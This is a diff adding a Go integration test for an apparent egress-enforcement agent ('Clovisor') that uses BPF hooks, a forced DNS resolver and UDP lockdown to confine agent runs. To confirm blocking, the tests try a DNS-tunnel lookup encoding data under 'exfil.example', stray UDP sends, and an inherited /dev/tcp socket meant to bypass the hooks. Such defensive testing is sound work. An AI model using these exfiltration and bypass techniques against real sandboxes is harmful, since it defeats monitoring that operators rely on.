@@ -1,0 +1,327 @@
+// Copyright (c) Authors of Clovisor
+//
+// All rights reserved. This program and the accompanying materials
+// are made available under the terms of the Apache License, Version 2.0
+// which accompanies this distribution, and is available at
+// http://www.apache.org/licenses/LICENSE-2.0
+
+//go:build integration
+
+package integration
+
+// TestTransparent runs transparent enforce mode end to end (milestone
+// 3.7): cgroup identity, the BPF hooks, the transparent listener, the
+// forced resolver and the UDP lockdown, with clients that ignore the
+// proxy. It needs a privileged container on a Linux host with BPF and
+// cgroup v2, so it runs only when asked:
+//
+//	make integration-transparent     # DOCKER="sudo docker" if needed
+//
+// The agent container shares the host's cgroup and PID namespaces (the
+// hooks attach to host cgroups, and the node agent finds Envoy by pid),
+// but keeps runs under a cgroup of its own and pins in a bpffs of its
+// own, so it does not disturb a node agent on the host. Envoy shares the
+// agent container's network namespace, where the transparent listener
+// and the resolver are on loopback.
+
+import (
+	"crypto/rand"
+	"fmt"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"strings"
+	"testing"
+	"time"
+)
+
+func TestTransparent(t *testing.T) {
+	if os.Getenv("CLOVISOR_IT_TRANSPARENT") == "" {
+		t.Skip("set CLOVISOR_IT_TRANSPARENT=1: needs a privileged container, BPF and cgroup v2")
+	}
+	docker := strings.Fields(os.Getenv("DOCKER"))
+	if len(docker) == 0 {
+		docker = []string{"docker"}
+	}
+	if _, err := exec.LookPath(docker[0]); err != nil {
+		t.Skip("docker not found")
+	}
+	var tag [4]byte
+	rand.Read(tag[:])
+	dir := t.TempDir()
+	if os.Getenv("CLOVISOR_IT_KEEP") != "" {
+		var err error
+		if dir, err = os.MkdirTemp("", "clovisor-it-"); err != nil {
+			t.Fatal(err)
+		}
+	}
+	e := &env{t: t, docker: docker, tag: fmt.Sprintf("%x", tag), dir: dir}
+	if err := os.Chmod(e.dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	e.build()
+	e.buildBPF()
+	e.pki()
+	e.startTransparent()
+
+	t.Run("status", e.testStatus)
+	t.Run("https-ignoring-proxy", e.testTransparentHTTPS)
+	t.Run("address-without-name", e.testAddressOnly)
+	t.Run("raw-tcp-by-name", e.testRawByName)
+	t.Run("dns", e.testForcedDNS)
+	t.Run("udp", e.testUDP)
+	t.Run("loopback", e.testLoopback)
+	t.Run("inherited-socket", e.testInheritedSocket)
+	t.Run("check-transparent", e.testCheckTransparent)
+	t.Run("fail-closed", e.testFailClosed) // last: stops the node agent
+	if t.Failed() {
+		out, _, _ := e.sh("cat /var/log/node-agent.log")
+		t.Logf("node agent log:\n%s", out)
+	}
+}
+
+// buildBPF compiles the BPF object into the shared bin directory.
+func (e *env) buildBPF() {
+	root, _ := filepath.Abs("..")
+	cmd := exec.Command("make", "bpf")
+	cmd.Dir = root
+	if out, err := cmd.CombinedOutput(); err != nil {
+		e.t.Fatalf("make bpf: %v\n%s", err, out)
+	}
+	data, err := os.ReadFile(filepath.Join(root, "libclovisor/ebpf/agent_audit.o"))
+	if err != nil {
+		e.t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(e.dir, "bin", "agent_audit.o"), data, 0o644); err != nil {
+		e.t.Fatal(err)
+	}
+}
+
+func (e *env) agentsCgroup() string { return "clovisor-it-" + e.tag }
+
+// py writes a Python script into the bin directory the containers mount,
+// and returns the command that runs it: scripts run inside sh -c '...',
+// where inline Python would need quoting.
+func (e *env) py(name, src string) string {
+	e.t.Helper()
+	if err := os.WriteFile(filepath.Join(e.dir, "bin", name+".py"), []byte(src), 0o644); err != nil {
+		e.t.Fatal(err)
+	}
+	return "python3 /it/bin/" + name + ".py"
+}
+
+// stopNodeAgent stops the node agent as an operator would (SIGINT).
+func (e *env) stopNodeAgent() error {
+	_, errOut, err := e.sh("kill -INT $(cat /run/node-agent.pid)")
+	if err != nil {
+		return fmt.Errorf("%v: %s", err, errOut)
+	}
+	return nil
+}
+
+// startTransparent brings up the origin (TLS, a banner port, a UDP echo),
+// a privileged agent container with the node agent in transparent
+// enforce mode, and Envoy in its network namespace.
+func (e *env) startTransparent() {
+	t := e.t
+	t.Cleanup(e.cleanup)
+	e.run("network", "create", e.name("net"))
+	e.run("volume", "create", e.name("run"))
+	e.startOrigin("-banner", ":2222", "-udp-echo", ":5000")
+	e.originIP = strings.TrimSpace(e.run("inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", e.name("origin")))
+	if e.originIP == "" {
+		t.Fatal("no origin address")
+	}
+	e.run("run", "-d", "--name", e.name("agent"), "--network", e.name("net"),
+		"--privileged", "--cgroupns", "host", "--pid", "host",
+		"-v", filepath.Join(e.dir, "bin")+":/it/bin:ro", "-v", filepath.Join(e.dir, "origin", "ca.crt")+":/it/test-ca.crt:ro",
+		"-v", e.name("run")+":/run/clovisor", agentImage, "sleep", "infinity")
+	// Runs' cgroups go as runs end; the agents cgroup itself is removed
+	// here, before the container goes (cleanups run last-in first-out).
+	t.Cleanup(func() {
+		if os.Getenv("CLOVISOR_IT_KEEP") == "" {
+			e.stopNodeAgent()
+			time.Sleep(time.Second)
+			// A run that outlived the node agent (fail-closed) leaves
+			// its cgroup; remove the runs first, then their parent.
+			cg := "/sys/fs/cgroup/" + e.agentsCgroup()
+			e.sh("for r in " + cg + "/run-*; do [ -d \"$r\" ] && rmdir \"$r\"; done; rmdir " + cg)
+		}
+	})
+	if _, errOut, err := e.sh("mkdir -p /etc/clovisor && mount -t bpf bpf /sys/fs/bpf"); err != nil {
+		t.Fatalf("prepare: %v %s", err, errOut)
+	}
+	e.run("cp", "policy-transparent", e.name("agent")+":/etc/clovisor/policy")
+	if out, errOut, err := e.sh(`set -e
+chown -R root:root /etc/clovisor && chmod 755 /etc/clovisor/policy && chmod 644 /etc/clovisor/policy/*
+cat /etc/ssl/certs/ca-certificates.crt /it/test-ca.crt > /run/clovisor/upstream.pem`); err != nil {
+		t.Fatalf("prepare agent: %v\n%s%s", err, out, errOut)
+	}
+	e.run("exec", "-d", e.name("agent"), "sh", "-c",
+		"echo $$ > /run/node-agent.pid; exec /it/bin/node-agent -identity cgroup -bpf /it/bin/agent_audit.o"+
+			" -agents-cgroup "+e.agentsCgroup()+
+			" -policy-dir /etc/clovisor/policy -proxy-listen 127.0.0.1:18000 -envoy-upstream-ca /run/clovisor/upstream.pem"+
+			" -transparent enforce -udp-allow "+e.originIP+":5000 > /var/log/node-agent.log 2>&1")
+	if out, errOut, err := e.sh(`for i in $(seq 50); do [ -S /run/clovisor/agent.sock ] && [ -f /run/clovisor/envoy.json ] && exit 0; sleep 0.1; done
+cat /var/log/node-agent.log; exit 1`); err != nil {
+		t.Fatalf("node agent did not start: %v\n%s%s", err, out, errOut)
+	}
+	e.run("run", "-d", "--name", e.name("envoy"), "--network", "container:"+e.name("agent"),
+		"-v", e.name("run")+":/run/clovisor", EnvoyImage, "-c", "/run/clovisor/envoy.json", "-l", "warn")
+	if out, errOut, err := e.sh(`for i in $(seq 100); do /it/bin/agentctl status 2>/dev/null | grep -q 'Healthy       yes' && exit 0; sleep 0.1; done
+/it/bin/agentctl status; exit 1`); err != nil {
+		logs, _ := e.dockerCmd("logs", e.name("envoy")).CombinedOutput()
+		t.Fatalf("node not healthy: %v\n%s%s\n%s", err, out, errOut, logs)
+	}
+}
+
+// trun runs script as a run under the transparent test profile, with the
+// proxy variables removed: every client here ignores the proxy.
+func (e *env) trun(script string) (string, string) {
+	e.t.Helper()
+	return e.agentRun("tp", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+script)
+}
+
+// timeline returns a run's timeline as agentctl prints it in JSON, once
+// the run has ended.
+func (e *env) timeline(runID string) string {
+	e.t.Helper()
+	for i := 0; i < 50; i++ {
+		if out, _, err := e.sh("/it/bin/agentctl events --json " + runID); err == nil && strings.Contains(out, `"ended_at"`) {
+			return out
+		}
+		time.Sleep(100 * time.Millisecond)
+	}
+	out, errOut, _ := e.sh("/it/bin/agentctl events --json " + runID)
+	e.t.Fatalf("no finished timeline for %s:\n%s%s", runID, out, errOut)
+	return ""
+}
+
+func (e *env) testStatus(t *testing.T) {
+	out, _, err := e.sh("/it/bin/agentctl status")
+	if err != nil {
+		t.Fatal(err)
+	}
+	expect(t, out, "Transparent   enforce", "Healthy       yes", "Proxy gated   yes", "Envoy ready   yes")
+}
+
+func (e *env) testTransparentHTTPS(t *testing.T) {
+	out, id := e.trun(`
+curl -sS https://origin.test/allowed
+echo "secret: $(curl -s https://origin.test/secret)"`)
+	expect(t, out, "origin.test GET /allowed", `"message":"The secret endpoint is off limits for this agent."`)
+	expect(t, e.timeline(id), `"verdict": "redirect"`, `"transparent": true`, `"sni": "origin.test"`)
+}
+
+func (e *env) testAddressOnly(t *testing.T) {
+	// TLS to the origin's address with no name: no rule names the
+	// address, and the run never looked a name up for it.
+	out, id := e.trun(`curl -sk -o /dev/null https://` + e.originIP + `/allowed || echo refused`)
+	expect(t, out, "refused")
+	expect(t, e.timeline(id), `"method": "CONNECT"`, `"decision": "deny"`)
+}
+
+func (e *env) testRawByName(t *testing.T) {
+	// SSH-like raw TCP by name: allowed through the run's own lookup. A
+	// port the rule does not name is refused (the proxy closes it).
+	out, id := e.trun(e.py("raw", `import socket
+s = socket.create_connection(("origin.test", 2222), timeout=5)
+print("banner", s.recv(32))
+s = socket.create_connection(("origin.test", 2223), timeout=5)
+print("2223", s.recv(32))
+`))
+	expect(t, out, "banner b'SSH-2.0-origin", "2223 b''")
+	expect(t, e.timeline(id), `"resolved_name": "origin.test"`)
+}
+
+func (e *env) testForcedDNS(t *testing.T) {
+	out, id := e.trun(`
+getent hosts origin.test >/dev/null && echo "origin resolved"
+getent hosts other.test >/dev/null || echo "other refused"
+getent hosts aGVsbG8gd29ybGQ.x7k2.exfil.example >/dev/null || echo "tunnel refused"
+` + e.py("dns", `import socket
+try:
+    socket.getaddrinfo("other.test", 443)
+except OSError as err:
+    print("python:", err)
+`))
+	expect(t, out, "origin resolved", "other refused", "tunnel refused", "python:")
+	expect(t, e.timeline(id), `"dns_blocked"`, `"other.test"`, `"agvsbg8gd29ybgq.x7k2.exfil.example"`)
+}
+
+func (e *env) testUDP(t *testing.T) {
+	out, id := e.trun(e.py("udp", `import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.settimeout(3)
+for dst in [("8.8.8.8", 443), ("`+e.originIP+`", 5001)]:
+    try:
+        s.sendto(b"x", dst)
+        print("sent", dst)
+    except OSError as err:
+        print("refused", dst[1], err.errno)
+s.sendto(b"ping", ("`+e.originIP+`", 5000))
+print("echo", s.recvfrom(16)[0])
+`))
+	expect(t, out, "refused 443 1", "refused 5001 1", "echo b'ping'")
+	// One report per unconnected socket: the first refusal.
+	expect(t, e.timeline(id), `"udp_refused": 1`, `"udp_refused_to"`, `"8.8.8.8"`)
+}
+
+func (e *env) testLoopback(t *testing.T) {
+	// A host service on loopback, outside any run.
+	e.run("exec", "-d", e.name("agent"), "python3", "-m", "http.server", "8766", "--bind", "127.0.0.1")
+	time.Sleep(time.Second)
+	out, _ := e.trun(`
+python3 -m http.server 8765 --bind 127.0.0.1 >/dev/null 2>&1 &
+sleep 1
+echo "same run: $(curl -s -o /dev/null -w %{http_code} http://127.0.0.1:8765/)"
+echo "host: $(curl -s http://127.0.0.1:8766/)"
+kill $!`)
+	expect(t, out, "same run: 200", "host: {", "node-local address")
+}
+
+func (e *env) testInheritedSocket(t *testing.T) {
+	// A TCP socket opened before the run, as standard input, would bypass
+	// the hooks: the run is refused.
+	_, errOut, err := e.sh(`bash -c 'exec 3<>/dev/tcp/` + e.originIP + `/2222; /it/bin/agentctl run --profile tp -- true <&3'`)
+	if err == nil || !strings.Contains(errOut, "network sockets created outside the run") {
+		t.Fatalf("run with an inherited socket: %v %s", err, errOut)
+	}
+}
+
+func (e *env) testCheckTransparent(t *testing.T) {
+	_, id := e.trun("getent hosts other.test; " + e.py("udp443", `import socket
+try:
+    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("8.8.8.8", 443))
+except OSError:
+    pass
+`))
+	e.timeline(id)
+	out, _, _ := e.sh("/it/bin/agentctl check --transparent --profile /etc/clovisor/policy/tp.yaml " + id)
+	expect(t, out, "as transparent enforce would decide", "dns    other.test", "udp    UDP 8.8.8.8:443")
+}
+
+func (e *env) testFailClosed(t *testing.T) {
+	// A run already going when the node agent stops: its next connect,
+	// and its next lookup, are refused.
+	conn := e.py("fc", `import socket
+try:
+    socket.create_connection(("`+e.originIP+`", 2222), timeout=3)
+    print("connected")
+except OSError as err:
+    print("connect errno", err.errno)
+`)
+	e.run("exec", "-d", e.name("agent"), "sh", "-c",
+		`/it/bin/agentctl run --profile tp -- sh -c 'sleep 3; `+conn+` > /tmp/fc.conn 2>&1; `+
+			`getent hosts origin.test > /tmp/fc.dns 2>&1; echo $? >> /tmp/fc.dns' > /tmp/fc.run 2>&1`)
+	time.Sleep(time.Second)
+	if err := e.stopNodeAgent(); err != nil {
+		t.Fatalf("stop node agent: %v", err)
+	}
+	time.Sleep(4 * time.Second)
+	out, _, _ := e.sh("cat /tmp/fc.conn /tmp/fc.dns; ls /sys/fs/bpf/clovisor/")
+	expect(t, out, "connect errno 1", "transparent-connect4")
+	if !strings.Contains(out, "\n2\n") {
+		t.Errorf("lookup not refused with the node agent down:\n%s", out)
+	}
+}
